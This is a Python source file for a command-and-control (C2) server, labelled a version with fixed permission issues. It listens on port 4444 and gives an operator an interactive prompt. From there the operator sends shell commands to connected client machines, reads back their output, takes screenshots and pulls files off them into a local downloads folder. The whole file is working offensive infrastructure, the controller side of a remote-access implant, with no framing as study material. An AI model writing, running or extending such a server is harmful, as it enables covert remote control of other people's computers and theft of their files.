# c2_server_fixed.py - FIXED PERMISSION ISSUES
import socket
import threading
import os
import time

class C2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.end_marker = "<END_OF_RESULT>"
        self.file_marker = "<END_OF_FILE>"
        
    def start_server(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
            
            print(f"[+] C2 Server listening on {self.host}:{self.port}")
            print(f"[+] Current directory: {os.getcwd()}")
            print("[+] Waiting for client connections...")
            
            while True:
                client_socket, client_address = self.socket.accept()
                print(f"[+] Client connected from {client_address}")
                
                client_handler = threading.Thread(
                    target=self.handle_client, 
                    args=(client_socket, client_address)
                )
                client_handler.daemon = True
                client_handler.start()
                
        except Exception as e:
            print(f"[-] Server error: {e}")
        finally:
            self.cleanup()
    
    def handle_client(self, client_socket, client_address):
        try:
            self.interactive_shell(client_socket)
        except Exception as e:
            print(f"[-] Client handler error: {e}")
        finally:
            print(f"[-] Client {client_address} disconnected")
            client_socket.close()
    
    def interactive_shell(self, client_socket):
        try:
            while True:
                command = input("C2> ").strip()
                
                if command.lower() == 'exit':
                    client_socket.send("stop".encode())
                    break
                elif command.lower() == 'help':
                    self.show_help()
                    continue
                elif command == "":
                    continue
                
                client_socket.send(command.encode())
                
                if command.startswith("download "):
                    self.receive_file(client_socket, command[9:])
                else:
                    self.receive_command_result(client_socket)
                    
        except KeyboardInterrupt:
            print("\n[!] Server shutdown by user")
            client_socket.send("stop".encode())
        except Exception as e:
            print(f"[-] Shell error: {e}")
    
    def receive_command_result(self, client_socket):
        full_data = ""
        client_socket.settimeout(5)
        
        while True:
            try:
                chunk = client_socket.recv(4096).decode('utf-8', errors='ignore')
                if not chunk:
                    break
                    
                full_data += chunk
                
                if self.end_marker in full_data:
                    result, remaining = full_data.split(self.end_marker, 1)
                    print(result)
                    break
                    
            except socket.timeout:
                if full_data:
                    print(full_data)
                break
            except:
                break
        
        if full_data and self.end_marker not in full_data:
            print(full_data)
    
    def receive_file(self, client_socket, filename):
        try:
            # First check if downloads directory exists
            downloads_dir = "downloads"
            if not os.path.exists(downloads_dir):
                os.makedirs(downloads_dir)
                print(f"[+] Created downloads directory: {downloads_dir}")
            
            # Wait for client response
            response = client_socket.recv(1024).decode()
            
            if response.startswith("FILE_START:"):
                file_size = int(response.split(":")[1])
                print(f"[+] Receiving file: {filename} ({file_size} bytes)")
                
                # Save to downloads folder with proper path
                downloaded_name = os.path.join(downloads_dir, f"downloaded_{os.path.basename(filename)}")
                
                received_bytes = 0
                
                with open(downloaded_name, "wb") as f:
                    while received_bytes < file_size:
                        chunk = client_socket.recv(4096)
                        if self.file_marker.encode() in chunk:
                            # Remove the marker and write remaining data
                            chunk = chunk.replace(self.file_marker.encode(), b"")
                            f.write(chunk)
                            received_bytes += len(chunk)
                            break
                        f.write(chunk)
                        received_bytes += len(chunk)
                        print(f"\r[+] Progress: {received_bytes}/{file_size} bytes", end="", flush=True)
                
                print(f"\n[+] File successfully received: {downloaded_name}")
                print(f"[+] File size: {received_bytes} bytes")
                
            elif "Error: File not found" in response:
                print(f"[-] File not found on client: {filename}")
            elif "File sent:" in response:
                # This is the confirmation message from the client
                if self.end_marker in response:
                    response = response.replace(self.end_marker, "")
                print(response)
            else:
                # Regular command result
                if self.end_marker in response:
                    response = response.replace(self.end_marker, "")
                print(response)
                
        except PermissionError:
            print(f"[-] Permission denied. Try running as administrator or choose a different directory.")
            print(f"[-] Current directory: {os.getcwd()}")
        except Exception as e:
            print(f"[-] File receive error: {e}")
    
    def show_help(self):
        print("\n📋 Available Commands:")
        print("  cd <directory>        - Change directory")
        print("  getcwd               - Get current directory")
        print("  dir OR ls            - List files")
        print("  whoami               - Get current user")
        print("  ipconfig OR ifconfig - Network info")
        print("  screenshot           - Take screenshot")
        print("  download <file>      - Download file from client")
        print("  test                 - Test connection")
        print("  exit                 - Exit server")
        print("  help                 - Show this help")
        print("\n💡 File Download Tips:")
        print("  - Files are saved in 'downloads' folder")
        print("  - Use absolute paths for reliable downloads")
        print("  - Example: download C:\\Users\\user\\file.txt")
        print("")
    
    def cleanup(self):
        if hasattr(self, 'socket'):
            self.socket.close()
        print("[+] Server shutdown complete")

if __name__ == '__main__':
    server = C2Server()
    server.start_server()
